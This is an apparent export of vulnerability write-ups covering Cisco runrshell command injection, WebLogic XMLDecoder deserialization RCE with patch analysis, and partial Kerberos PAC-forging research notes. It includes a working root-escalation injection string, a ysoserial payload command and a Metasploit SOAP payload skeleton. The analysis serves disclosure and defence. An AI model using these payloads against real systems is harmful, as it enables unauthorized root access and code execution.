8\r\n.text:000000000040072C                 leave\r\n.text:000000000040072D                 retn\r\n.text:000000000040072D main            endp\r\n```\r\n\r\nWe can see that initially, the binary wants to be run as root:\r\n\r\n```assembly\r\nmov     [rbp+var_814], edi\r\nmov     [rbp+var_820], rsi\r\nmov     edi, 0          ; uid\r\ncall    _setuid\r\nmov     edi, 0          ; gid\r\ncall    _setgid\r\n```\r\n\r\nThe next thing that happens is, it tries to set the PATH environment variable to a specific path, which intends to limit what the user can execute:\r\n\r\n```assembly\r\nmov     edx, 1          ; replace\r\nmov     esi, offset value ; \"/opt/CSCOlumos/rcmds\"\r\nmov     edi, offset name ; \"PATH\"\r\ncall    _setenv\r\n```\r\n\r\nNot only that, the program also wants to spawn a restricted shell, probably trying to guard the PATH variable being changed, plus other protections.\r\n\r\n```assembly\r\nmov     ecx, offset aBinBashRC ; \"/bin/bash -r -c \\\"\"\r\nlea     rax, [rbp+dest]\r\nmov     edx, 12h        ; n\r\nmov     rsi, rcx        ; src\r\nmov     rdi, rax        ; dest\r\ncall    _memcpy\r\n```\r\n\r\nHowever, all this falls apart when the program uses `system()` to execute the command, with the user having control of the `dest` argument, allowing command injection:\r\n\r\n```assembly\r\nmov     edx, offset asc_400856 ; \"\\\"\"\r\nlea     rax, [rbp+dest]\r\nmov     rsi, rdx        ; src\r\nmov     rdi, rax        ; dest\r\ncall    _strcat\r\nlea     rax, [rbp+dest]\r\nmov     rdi, rax        ; command\r\ncall    _system\r\n```\r\n\r\nAs a result, we can still execute arbitrary commands with runrshell:\r\n\r\n```bash\r\nade # id   \r\nuid=500(admin) gid=110(gadmin) groups=110(gadmin) context=unconfined_u:system_r:unconfined_t:s0-s0:c0.c1023\r\nade # /opt/CSCOlumos/bin/runrshell '\" && /usr/bin/id #'\r\nuid=0(root) gid=0(root) groups=0(root),110(gadmin) context=unconfined_u:system_r:unconfined_t:s0-s0:c0.c1023\r\nade # \r\n```\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "c13b495e-b052-4ea1-9540-5ae9b7926370",
      "editorId": "be56a709-ab70-4e82-8afc-87943f13dfe4",
      "topicId": "7992242a-e0f4-4572-be13-859467611f09",
      "created": "2019-09-12T18:06:58.260664Z",
      "revisionDate": "2020-04-28T21:33:37.090634Z",
      "document": "## Opinion\r\n\r\nThis product isn't used everywhere, but it's common in large enterprise networks.  In some instances, it would be expected to see this product externally accessible, allowing an attacker initial access to the network.\r\n\r\n## Background\r\n\r\nOracle WebLogic Server (WLS) is a Java EE application server currently developed by Oracle, and it was acquired from BEA Systems in 2008. It is also bundled in other Oracle products such as Oracle Application Testing Suite, which is what the analysis is based on. By default, OATS ships with WebLogic 12.1.3.\r\n\r\nThe AsyncResponseService component in WebLogic allows a remote user to send a SOAP request that contains a malicious payload in XML format, which ends up being parsed and decoded as Java code, and result in remote code execution.\r\n\r\nOur analysis is also based on Metasploit Framework's pull request [#11780](https://github.com/rapid7/metasploit-framework/pull/11780).\r\n\r\n## Vulnerable Setup\r\n\r\nThe following is the exact setup I used to test and analyze the vulnerability:\r\n\r\n- Windows Server 2008 R2 x64 (other Windows systems are also supported)\r\n  - .Net Framework 3.5 enabled (from add/remove features)\r\n  - IE ESC (from Server Manager) disabled\r\n  - 8GB of RAM (at least more than 4GB will be used to run OATS)\r\n  - Duel-Core processor\r\n- [oats-win64-full-13.3.0.1.262.zip](https://download.oracle.com/otn/nt/apptesting/13.3.0.1/oats-win64-full-13.3.0.1.262.zip?AuthParam=1556777168_2adf60d3eeef4dd1b101c27e10687ee4) (x86 did not work for me)\r\n- [Jdk-7u21-windows-x64.exe](https://download.oracle.com/otn/java/jdk/7u21-b11/jdk-7u21-windows-x64.exe?AuthParam=1556774666_2bb4d38d69aa5fca7e877b62030680a1)\r\n- [OracleXE112_Win64.zip](https://download.oracle.com/otn/nt/oracle11g/xe/OracleXE112_Win64.zip?AuthParam=1556742235_240fcb1f3d65a474b8bc52709006e3d4) (Newer version 18c did not work well for me)\r\n- [Firefox](https://download-installer.cdn.mozilla.net/pub/firefox/releases/66.0.3/win64/en-US/Firefox%20Setup%2066.0.3.exe) (I had to install this because IE on Win2k8 is completely outdated)\r\n- Adobe Flash installed (IE ESC needs to be disabled in order to install this)\r\n\r\nFor installation instructions, please refer to the [Oracle Application Testing Suite Installation Guide]().\r\n\r\n## The Basics of Java Serialization\r\n\r\n### XMLEncoder\r\n\r\nTo convert a Java object in XML format, XMLEncoder is meant for that. For example:\r\n\r\n```java\r\nimport java.io.*;\r\nimport java.beans.XMLEncoder;\r\nimport java.util.HashMap;\r\n\r\npublic class SerializationExample {\r\n    public static void serialize(Object obj) throws Exception {\r\n      ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\r\n      XMLEncoder encoder = new XMLEncoder(outputStream);\r\n      encoder.writeObject(obj);\r\n      encoder.close();\r\n      String xml = outputStream.toString();\r\n      System.out.println(xml);\r\n    }\r\n\r\n    public static void main(String[] args) throws Exception {\r\n      HashMap map = new HashMap();\r\n      map.put(\"key1\", \"Hello World\");\r\n      serialize(map);\r\n    }\r\n}\r\n```\r\n\r\nThe above will produce the following XML (this is saved as example.xml for decoding):\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<java version=\"1.8.0_212\" class=\"java.beans.XMLDecoder\">\r\n <object class=\"java.util.HashMap\">\r\n  <void method=\"put\">\r\n   <string>key1</string>\r\n   <string>Hello World</string>\r\n  </void>\r\n </object>\r\n</java>\r\n```\r\nTo produce unsafe serialized data, you can use [ysoserial](https://github.com/frohoff/ysoserial). Another example (that executes system command `whoami`):\r\n\r\n```bash\r\n$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 whoami\r\n```\r\n\r\n### XMLDecoder\r\n\r\nTo convert XML back to Java code, XMLDecoder is used:\r\n\r\n```java\r\nimport java.io.*;\r\nimport java.beans.XMLDecoder;\r\nimport java.util.HashMap;\r\n\r\npublic class DeserializationExample {\r\n    public static Object deserialize(String xmlPath) throws Exception {\r\n      BufferedInputStream inputStream = new BufferedInputStream(new FileInputStream(xmlPath));\r\n      XMLDecoder decoder = new XMLDecoder(inputStream);\r\n      Object obj = decoder.readObject();\r\n      decoder.close();\r\n      return obj;\r\n    }\r\n\r\n    @SuppressWarnings(\"unchecked\")\r\n    public static void main(String[] args) throws Exception {\r\n      Object obj = deserialize(\"example.xml\");\r\n      HashMap map = (HashMap) obj;\r\n      String value = map.get(\"key1\");\r\n      System.out.println(value);\r\n    }\r\n}\r\n```\r\n\r\nAnd this is our ouput for deserializing example.xml:\r\n\r\n```\r\n$ java DeserializationExample\r\nHello World\r\n```\r\n\r\n## Vulnerability Analysis\r\n\r\nBased on previous experience with Oracle Application Testing Suite, I know that WebLogic is installed as a Windows service named \"Oracle ATS Server.\" It listens on port 8088, which actually isn't the same as the original WebLogic port on 7001. Since WebLogic is a Java EE application server, a proper way to debug it is using a Java decompiler (such as JD-GUI) to look at JAR files, and setting up a remote debugging environment for real-time analysis.\r\n\r\n### Remote Debugging WebLogic\r\n\r\nTo set up remote debugging for dynamic analysis, the first thing for OATS is making sure the WebLogic service is shut down. You may go to Control Panel -> Services to do that. Next, we want to modify WebLogic's starting script, also known as ***startWebLogic.cmd***. In this file, we want to add the following line as the first JAVA_OPTIONS:\r\n\r\n```\r\nset JAVA_OPTIONS=-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=4000,server=y,suspend=n\r\n```\r\n\r\nAnd then we can go ahead and start the script:\r\n\r\n```\r\nC:\\OracleATS\\oats\\bin\\startWebLogic.cmd\r\n```\r\n\r\nNote: If you have WebLogic installed (and not OATS), you might have a different directory structure, but the starting script is always named startWebLogic.cmd.\r\n\r\nAfter executing the script, there should be two ports. Port 4000 is the port our debugger can attach to, and port 8088 is the WebLogic Service. At this point, you can use a debugger to connect to port 4000 and start the debugging session. In my case, I am using IntelliJ out of personal preference.\r\n\r\n### Finding AsyncResponseService Code in OATS\r\n\r\nFinding the AsyncResponseService code is a mystery in OATS. There are a lot of JAR files, and what we want is clearly buried somewhere. Without understanding the architecture, realistically speaking we are better off digging some documentation and look for a hint there. Thankfully, Oracle does a pretty good job in documentation, so we found the following WebLogic server client type table in this write-up titled \"[Oracle Fusion Middleware Developing Stand-alone Clients for Oracle WebLogic Server](https://docs.oracle.com/middleware/1212/wls/SACLT/basics.htm#SACLT117)\":\r\n\r\n| Client                              | Type         | Language   | Protocol                          | Client Class                                                 |\r\n| ----------------------------------- | ------------ | ---------- | --------------------------------- | ------------------------------------------------------------ |\r\n| WL Thin T3 Client                   | RMI          | Java       | T3                                | wlthint3client.jar                                           |\r\n| WL Full Client (T3)                 | RMI          | Java       | T3                                | wlfullclient.jar                                             |\r\n| WLS-LLOP                            | RMI          | Java       | LLOP                              | wlfullclient.jar                                             |\r\n| Thin Client                         | RMI          | Java       | LLOP                              | wlclient.jar                                                 |\r\n| CORBA/IDL                           | CORBA        | Mix        | LLOP                              | No WL classes                                                |\r\n| Java SE                             | RMI          | Java       | LLOP                              | No WL classes                                                |\r\n| JMS Thin Client                     | RMI          | Java       | LLOP                              | wljmsclient.jar<br/>wlclient.jar                            |\r\n| JMS SAF Client                      | RMI          | Java       | LLOP                              | wlsafclient.jar/wlthint3client.jar<br/>or<br/>wlsafclient.jar/wljmsclient.jar/wlclient.jar |\r\n| JMS C Client                        | JNI          | C          | Any                               | wlthint3client.jar                                           |\r\n| JMS .Net Client                     | T3           | .Net       | T3                                | WebLogic.Messaging.dll                                       |\r\n| WebLogic AQ JMS Client              | JNDI         | Java       | LLOP/T3+                          | aqapi.jar, o6.jar, orail8n.jar, wlclient.jar, wlfullclient.jar, weblogic.jar, or wlthint3client.jar |\r\n| JMX                                 | RMI          | Java       | LLOP                              | wljmxclient.jar                                              |\r\n| ***Web Services***                  | ***SOAP***   | ***Java*** | ***HTTP/S***                      | ***wseeclient.jar***                                         |\r\n| C++ Client                          | CORBA        | C++        | LLOP                              | Tuxido lib                                                   |\r\n| Tuxedo Server & Native CORBA client | CORBA or RMI | C++        | Tuxedo-General-Inter-Orb-Protocol | Tuxedo lib                                                   |\r\n\r\nNotice wseeclient.jar is for WebLogic's SOAP service, so that's what we to analyze. Usually I'd be pretty happy about that, except OATS doesn't have this file (a stand-alone WebLogic server does, though). This just indicates the web service class is probably a dependency of some client when it is built, so we need to find that client.\r\n\r\nIn a different documentation ([Oracle Fusion Middleware Developing JAX-WS Web Services for Oracle WebLogic Server](https://docs.oracle.com/middleware/1212/wls/WSGET/jax-ws-client.htm#WSGET229)), it mentions a JAR called ***com.oracle.webservices.wls.jaxws-wlswss-client_12.1.2.jar*** in a table:\r\n\r\n| Jar File                                                  | Location                              | Description                                                  |\r\n| --------------------------------------------------------- | ------------------------------------- | ------------------------------------------------------------ |\r\n| com.oracle.webservices.wls.jaxws-wlswss-client_12.1.2.jar | ORACLE_HOME/wlserver/modules/clients/ | Supports basic JAX-WS client-side functionality including:<br/><br/>* Using client-side artifacts created by both the clientgen Ant tasks.<br/>* Processing SOAP messages<br/>* Using advanced features such as web services reliable messaging, WS addressing, ***asynchronous request-response***, and MTOM.<br/>* Using WS-Security<br/>* Using client-side SOAP message handlers<br/>* Invoking both JAX-WS and JAX-RPC web services<br/>* Using SSL |\r\n\r\nThere are other ones, but the one above is more interesting, because it literally says it supports **asynchronous** request and **response**. Sounds like a match for **AsyncResponseService**, right? Well, by decompiling com.oracle.webservices.wls.jaxws-wlswss-client.jar, we found **AsyncResponseHandler**, which apparently is a valid starting point because it hits our breakpoint in IntelliJ.\r\n\r\n### The Execution Flow Map\r\n\r\nWebLogic is quite a complex application to analyze. Although we hit the AsyncResponseHandler breakpoint, turns out it isn't the best place because we are kind of in the middle of the code, therefore we should map out the flow a little bit to understand the whole picture. We know that our Java payload is triggering ProcessBuilder, so we can set up a breakpoint there, and understand what happened:\r\n\r\n```\r\nstart:1007, ProcessBuilder (java.lang)\r\ninvoke0:-1, NativeMethodAccessorImpl (sun.reflect)\r\ninvoke:62, NativeMethodAccessorImpl (sun.reflect)\r\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\r\ninvoke:498, Method (java.lang.reflect)\r\ninvoke:71, Trampoline (sun.reflect.misc)\r\ninvoke:-1, GeneratedMethodAccessor37 (sun.reflect)\r\ninvoke:43, DelegatingMethodAccessorImpl (sun.reflect)\r\ninvoke:498, Method (java.lang.reflect)\r\ninvoke:275, MethodUtil (sun.reflect.misc)\r\ninvokeInternal:292, Statement (java.beans)\r\naccess$000:58, Statement (java.beans)\r\nrun:185, Statement$2 (java.beans)\r\ndoPrivileged:-1, AccessController (java.security)\r\ninvoke:182, Statement (java.beans)\r\ngetValue:155, Expression (java.beans)\r\ngetValueObject:166, ObjectElementHandler (com.sun.beans.decoder)\r\ngetValueObject:123, NewElementHandler (com.sun.beans.decoder)\r\nendElement:169, ElementHandler (com.sun.beans.decoder)\r\nendElement:318, DocumentHandler (com.sun.beans.decoder)\r\nendElement:609, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)\r\nemptyElement:183, AbstractXMLDocumentParser (com.sun.org.apache.xerces.internal.parsers)\r\nscanStartElement:1339, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)\r\nnext:2784, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)\r\nnext:602, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)\r\nscanDocument:505, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)\r\nparse:841, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)\r\nparse:770, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)\r\nparse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)\r\nparse:1213, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)\r\nparse:643, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)\r\nparse:133, WebLogicXMLReader (weblogic.xml.jaxp)\r\nparse:173, RegistryXMLReader (weblogic.xml.jaxp)\r\nparse:392, SAXParser (javax.xml.parsers)\r\nrun:375, DocumentHandler$1 (com.sun.beans.decoder)\r\nrun:372, DocumentHandler$1 (com.sun.beans.decoder)\r\ndoPrivileged:-1, AccessController (java.security)\r\ndoIntersectionPrivilege:80, ProtectionDomain$JavaSecurityAccessImpl (java.security)\r\nparse:372, DocumentHandler (com.sun.beans.decoder)\r\nrun:201, XMLDecoder$1 (java.beans)\r\nrun:199, XMLDecoder$1 (java.beans)\r\ndoPrivileged:-1, AccessController (java.security)\r\nparsingComplete:199, XMLDecoder (java.beans)\r\nreadObject:250, XMLDecoder (java.beans)\r\nreadUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)\r\nreadEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)\r\nreceiveRequest:179, WorkContextLocalMap (weblogic.workarea)\r\nreceiveRequest:163, WorkContextMapImpl (weblogic.workarea)\r\nhandleRequest:33, WorkAreaServerHandler (weblogic.wsee.workarea)\r\nhandleRequest:142, HandlerIterator (weblogic.wsee.handler)\r\ndispatch:115, ServerDispatcher (weblogic.wsee.ws.dispatch.server)\r\ninvoke:80, WsSkel (weblogic.wsee.ws)\r\nhandlePost:66, SoapProcessor (weblogic.wsee.server.servlet)\r\nprocess:44, SoapProcessor (weblogic.wsee.server.servlet)\r\nrun:301, BaseWSServlet$AuthorizedInvoke (weblogic.wsee.server.servlet)\r\nservice:177, BaseWSServlet (weblogic.wsee.server.servlet)\r\nservice:844, HttpServlet (javax.servlet.http)\r\nrun:280, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)\r\nrun:254, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)\r\ninvokeServlet:136, StubSecurityHelper (weblogic.servlet.internal)\r\nexecute:346, ServletStubImpl (weblogic.servlet.internal)\r\nexecute:243, ServletStubImpl (weblogic.servlet.internal)\r\nwrapRun:3432, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)\r\nrun:3402, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)\r\ndoAs:321, AuthenticatedSubject (weblogic.security.acl.internal)\r\nrunAs:120, SecurityManager (weblogic.security.service)\r\nrun:57, WlsSubjectHandle (weblogic.servlet.provider)\r\ndoSecuredExecute:2285, WebAppServletContext (weblogic.servlet.internal)\r\nsecuredExecute:2201, WebAppServletContext (weblogic.servlet.internal)\r\nexecute:2179, WebAppServletContext (weblogic.servlet.internal)\r\nrun:1572, ServletRequestImpl (weblogic.servlet.internal)\r\nrun:255, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)\r\nexecute:311, ExecuteThread (weblogic.work)\r\nrun:263, ExecuteThread (weblogic.work)\r\n```\r\n\r\nBy examining a number of backtraces (in SoapProcess, HandlerIterator, AsyncResponseHandler, ProcessBuilder, etc), we have roughly this map:\r\n\r\n```\r\nSoapProcess -> HandlerIterator\r\n                      |\r\n                      | -> AsyncResponseHandler\r\n                      | -> WorkAreaServerHandler -> XML Parsing -> ProcessBuilder\r\n                      | -> Other handlers (21 total)\r\n```\r\n\r\n#### HandlerIterator Class\r\n\r\nIn here, multiple handlers are found in the handlers variable, and each has its own handleRequest routine. The code that actually performs the iteration goes like this: \r\n\r\n```java\r\nfor (; this.index < this.handlers.size(); this.index++) {\r\n\r\n  Handler handler = this.handlers.get(this.index);\r\n\r\n  // ... Some code goes here ... //\r\n\r\n  try {\r\n    context.setProperty(\"weblogic.wsee.handler.index\", new Integer(this.index));\r\n    if (!handler.handleRequest(context)) {\r\n      // ... some code goes here ...//\r\n```\r\n\r\nAt run-time, index 12 seem to hold our AsyncResponseHandler, and 16 is the WorkAreaServerHandler.\r\n\r\n#### AsyncResponseHandler Class\r\n\r\nThe purpose of the AsyncResponseHandler classs is to process an incoming async response message. It is triggered when the client sends a request to the `/_async/AsyncResponseService` path. The official Oracle website actually has this [documented](https://docs.oracle.com/middleware/12213/wls/WLAPI/weblogic/wsee/async/AsyncResponseHandler.html) quite well:\r\n\r\n> This handler only exists within the 'async response service' web service. The async response service is a special service that provides an addressable endpoint for services that have been invoked asynchronously by a client on the same server instance. The async response service is layered on top of our AsyncResponseBean JWS impl. To the server hosting the async response service, an async response looks like a request, but is the async response portion of a prior async request. This handler ultimately processes this async response using the ClientDispatcher handleAsyncResponse method, which uses the handler chain's handleResponse logic. This handler assumes that at least one handler in the client handler chain will load the SoapMessageContext.getOutParams() map with the correctly processed async response message. It then stores this response (or fault) in the ASYNC_RESPONSE_PROPERTY (or ASYNC_FAULT_PROPERTY) context variable for use by AsyncResponseBean. This last (AsyncResponseBean) is ultimately called by the ComponentHandler. The AsyncResponseBean handles looking up the proper callback method on the JWS and invoking it with the async response processed/generated by this handler.\r\n\r\nSince the PoC is feeding the action and relates field with random values, this would cause AsyncResponseHandler to bail in the handleRequestInternal method:\r\n\r\n```java\r\nWsStorage storage = WsStorageFactory.getStorage(\"weblogic.wsee.async.store\", new AsyncInvokeStateObjectHandler());\r\n\r\ntry {\r\n  ais = (AsyncInvokeState)storage.persistentGet(relatesTo);\r\n  if (ais == null) {\r\n    throw new JAXRPCException(\"Cannot retrieve request information for message \" + relatesTo);\r\n  }\r\n}\r\ncatch (PersistentStoreException e) {\r\n  if (LOGGER.isLoggable(Level.FINE))\r\n    LOGGER.log(Level.FINE, e.getMessage(), e); \r\n  throw new JAXRPCException(e);\r\n} \r\n```\r\n\r\n#### WorkAreaServerHandler\r\n\r\nThe WorkAreaServerHandler is actually the one that eventually triggers XML parsing. There seems to be no official API documentation about this class, but most write-ups related to WorkAreaServerHandler are associated with CVE-2017-10271.\r\n\r\nWhen HandlerIterator calls WorkAreaServerHandler's handleRequest method, this line is most interesting:\r\n\r\n```java\r\ninterceptor.receiveRequest(new WorkContextXmlInputAdapter(header.getInputStream()));\r\n```\r\n\r\nA lot of things happen in this line of code. The first that happens is the getInputStream() loading up the XML code for workarea, meaning this portion here, and returns a ByteArrayInputStream:\r\n\r\n```ruby\r\nsoap_payload <<     %Q||\r\nsoap_payload <<       %Q||\r\nsoap_payload <<         %Q||\r\nsoap_payload <<           %Q||\r\nsoap_payload <<             %Q|#{string0_cmd}|\r\nsoap_payload <<           %Q||\r\nsoap_payload <<           %Q||\r\nsoap_payload <<             %Q|#{string1_param}|\r\nsoap_payload <<           %Q||\r\nsoap_payload <<           %Q||\r\nsoap_payload <<             %Q|#{shell_payload.encode(xml: :text)}|\r\nsoap_payload <<           %Q||\r\nsoap_payload <<         %Q||\r\nsoap_payload <<       %Q||\r\nsoap_payload <<       %Q||\r\nsoap_payload <<     %Q||\r\n```\r\n\r\nAfter getting the ByteArrayInputStream, WorkContextXmlInputAdapter loads that in XMLDecoder:\r\n\r\n```java\r\nprivate final XMLDecoder xmlDecoder;\r\npublic WorkContextXmlInputAdapter(InputStream is) { this.xmlDecoder = new XMLDecoder(is); }\r\n```\r\n\r\nThe receiveRequest will then trigger WorkContextXmlInputAdapter to read the first object defined in the XML document with the readObject method:\r\n\r\n```java\r\npublic String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); }\r\n```\r\n\r\nAfter readObject is called, a chain of reactions will occur to deserialize the XML file back to Java code, which in this case is processing the malicious ProcessBuilder code.\r\n\r\n## Patch Analysis\r\n\r\nIn WorkContextXmlInputAdapter, instead of loading the InputStream directy to XMLDecoder, some validation occurs:\r\n\r\n```java\r\npublic WorkContextXmlInputAdapter(InputStream var1) {\r\n  ByteArrayOutputStream var2 = new ByteArrayOutputStream();\r\n  try {\r\n    boolean var3 = false;\r\n    for (int var5 = var1.read(); var5 != -1; var5 = var1.read()) {\r\n      var2.write(var5);\r\n    }\r\n  } catch (Exception var4) {\r\n    throw new IllegalStateException(\"Failed to get data from input stream\", var4);\r\n  }\r\n\r\n  this.validate(new ByteArrayInputStream(var2.toByteArray()));\r\n  this.xmlDecoder = new XMLDecoder(new ByteArrayInputStream(var2.toByteArray()));\r\n}\r\n```\r\n\r\nThe validate method invovles checking a collection of XML tags that could be abused, such as: object, new, method, void, and array. These restrictions would easily stop ysoserial payloads:\r\n\r\n```java\r\nprivate void validate(InputStream var1) {\r\n  WebLogicSAXParserFactory var2 = new WebLogicSAXParserFactory();\r\n\r\n  try {\r\n    SAXParser var3 = var2.newSAXParser();\r\n    var3.parse(var1, new DefaultHandler() {\r\n      private int overallarraylength = 0;\r\n      public void startElement(String var1, String var2, String var3, Attributes var4) throws SAXException {\r\n        if (var3.equalsIgnoreCase(\"object\")) {\r\n          throw new IllegalStateException(\"Invalid element qName:object\");\r\n        } else if (var3.equalsIgnoreCase(\"new\")) {\r\n          throw new IllegalStateException(\"Invalid element qName:new\");\r\n        } else if (var3.equalsIgnoreCase(\"method\")) {\r\n          throw new IllegalStateException(\"Invalid element qName:method\");\r\n        } else {\r\n          if (var3.equalsIgnoreCase(\"void\")) {\r\n            for(int var5 = 0; var5 < var4.getLength(); ++var5) {\r\n              if (!\"index\".equalsIgnoreCase(var4.getQName(var5))) {\r\n                throw new IllegalStateException(\"Invalid attribute for element void:\" + var4.getQName(var5));\r\n              }\r\n            }\r\n          }\r\n\r\n          if (var3.equalsIgnoreCase(\"array\")) {\r\n            String var9 = var4.getValue(\"class\");\r\n            if (var9 != null && !var9.equalsIgnoreCase(\"byte\")) {\r\n              throw new IllegalStateException(\"The value of class attribute is not valid for array element.\");\r\n            }\r\n\r\n            String var6 = var4.getValue(\"length\");\r\n            if (var6 != null) {\r\n              try {\r\n                int var7 = Integer.valueOf(var6);\r\n                if (var7 >= WorkContextXmlInputAdapter.MAXARRAYLENGTH) {\r\n                  throw new IllegalStateException(\"Exceed array length limitation\");\r\n                }\r\n\r\n                this.overallarraylength += var7;\r\n                if (this.overallarraylength >= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {\r\n                  throw new IllegalStateException(\"Exceed over all array limitation.\");\r\n                }\r\n              } catch (NumberFormatException var8) {\r\n                // ...\r\n              };\r\n  }\r\n```\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "c12cd034-099e-48af-89fd-cc562193e606",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "99e0cdf8-533a-4b89-a7f9-f0d8eb5bf55b",
      "created": "2019-09-12T18:07:02.084481Z",
      "revisionDate": "2020-10-19T22:18:17.818123Z",
      "document": "\n\nTroubleshooting kerberos on windows\n\n* http://blogs.technet.com/b/askds/archive/2008/05/14/troubleshooting-kerberos-authentication-problems-name-resolution-issues.aspx\n* http://technet.microsoft.com/en-us/library/cc738673(WS.10).aspx\n* http://www.itninja.com/blog/view/taming-the-three-headed-beast-kerberos\n\nGolden and silver ticket\n\n* http://rycon.hu/papers/goldenticket.html\n* https://www.youtube.com/watch?v=-IMrNGPZTl0 (blackhat)\n* http://www.slideshare.net/gentilkiwi/bluehat-2014realitybites\n* http://www.nosuchcon.org/talks/2014/D2_02_Benjamin_Delpy_Mimikatz.pdf\n* http://blog.gentilkiwi.com/downloads/mimikatz-rmll.pdf\n* http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos\n* http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos (ticket format)\n* https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos\n\n# About PAC:\n\nMS-PAC: Privilege Attribute Certificate Data Structure\nhttp://msdn.microsoft.com/en-us/library/cc237917.aspx\n\nMicrosoft Authorization Data Specification\nhttp://mirror.die.net/banned/microsoft-kerberos-extensions.html\n\nAuthentication structures:\n\nhttp://msdn.microsoft.com/en-us/library/windows/desktop/aa378120(v=vs.85).aspx\n\nMore Kerberos fun with PAC\u2019s- decrypt the PAC\n\nhttp://i1.blogs.msdn.com/b/spatdsg/archive/2009/03/26/more-kerberos-fun-with-pac-s.aspx\n\nKerberos PAC Validation\u2026 what is it?\n\nhttp://blogs.msdn.com/b/spatdsg/archive/2007/03/07/pac-validation.aspx\n\nKerberos on windows\n\nhttps://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-whitepaper.pdf\nhttp://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos\n\n# Notes\n\n- Windows 2003: Security Event ids related to kerberos 540 (logon) / 538 (logoff)\n- I'm pretty sure the information to forge exists inside service kerberos ticket\n- On my opinion the idea is to forge the KERB_VALIDATION_INFO. It contains:\n\n```\nULONG GroupCount;\n[size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;\n```\n\nWhere:\n\n```\n  typedef struct _GROUP_MEMBERSHIP {\n      ULONG RelativeId;\n      ULONG Attributes;\n  } *PGROUP_MEMBERSHIP;\n```\n\n\nBy modifying the RelativeId in the service ticket, I think is the way related\nto the privilege escalation (See ticket_samples.txt for KERB_VALIDATION_INFO dump)\n\nBut... how to tamper that information? Since the kerberos communication (server\nrunning on 88/udp) happens through lsass (running as system), tampering communications\ndoesn't look a good idea. Even worse, the KERB_VALIDATION_INFO is located inside the\nticket, which travels encrypted. I NEED TO CHECK, CAREFULLY WHERE THE PAC IS ADDED,\nHOPEFULLY, IT'S IN A BLOG CIPHERED WITH THE USER PRIVATE KEY. CANNOR REMIND JUST NOW, TODO!\n\nJust remembering cached tickets maybe can be tampered TODO:review\n\n# Breakpoints:\n\n```\nbp kdcsvc!I_GetAsTicket \".echo I_GetAsTicket; g\"\n```\n\nReachecd through _KdcGetTicket (also an export)\n\n```\nbp kdcsvc!KdcVerifyPacSignature \".echo KdcVerifyPacSignature; g\"\n```\n\nThis one is reached from when handling TGT Requests, aparently\n\nHandleTGSRequest -> GetTGSTicket...\n\n```\nbp kdcsvc!KdcVerifyPac \".echo KdcVerifyPac; g\"\n```\n\nIt's an export, also reached through \"CredentialUpdateFree\"\n\nWhen I authenticate to a service, IIS, through Kerberos, it's the call sequence:\n\n```\nI_GetAsTicket\nKdcVerifyPacSignature\nKdcVerifyPacSignature\nI_GetAsTicket\nKdcVerifyPacSignature\n```\n\nOkay, come on to check, what happens when I add the kerberos function:\n\n```\nkd> bp kerberos!KerbVerifyPacsignature \".echo kerberos!KerbVerifyPacsignature; g\"\nkd> g\nI_GetAsTicket\nKdcVerifyPacSignature\nkerberos!KerbVerifyPacsignature\nI_GetAsTicket\nKdcVerifyPacSignature\nkerberos!KerbVerifyPacsignature\n```\n\nMakes sense! Come on to check some call stacks to check where things come from:\n\n```\nkd> bl\n 0 e 63a8b814     0001 (0001) KDCSVC!I_GetASTicket \".echo I_GetAsTicket; kb 4; g\"\n 1 e 63a89013     0001 (0001) KDCSVC!KdcVerifyPacSignature \".echo KdcVerifyPacSignature; kb 4; g\"\n 2 e 63a8d3ad     0001 (0001) KDCSVC!KdcVerifyPac \".echo KdcVerifyPac; kb 4; g\"\n 3 e 71ca8587     0001 (0001) kerberos!KerbVerifyPacSignature \".echo kerberos!KerbVerifyPacsignature; kb 4; g\"\n ```\n\n_GetAsTicket\n\n```\nChildEBP RetAddr  Args to Child\n04e4fe38 63a8b80a 050ae688 001583e8 04e4feb0 KDCSVC!I_GetASTicket\n04e4fed8 63a87305 00000000 050ae688 001149a8 KDCSVC!KdcGetTicket+0x1b5\n04e4ff38 71fd1700 0015b9e0 00000137 00000000 KDCSVC!KdcAtqDgIoCompletion+0x129\n04e4ff58 71fd1858 00000137 00000000 0015b9e4 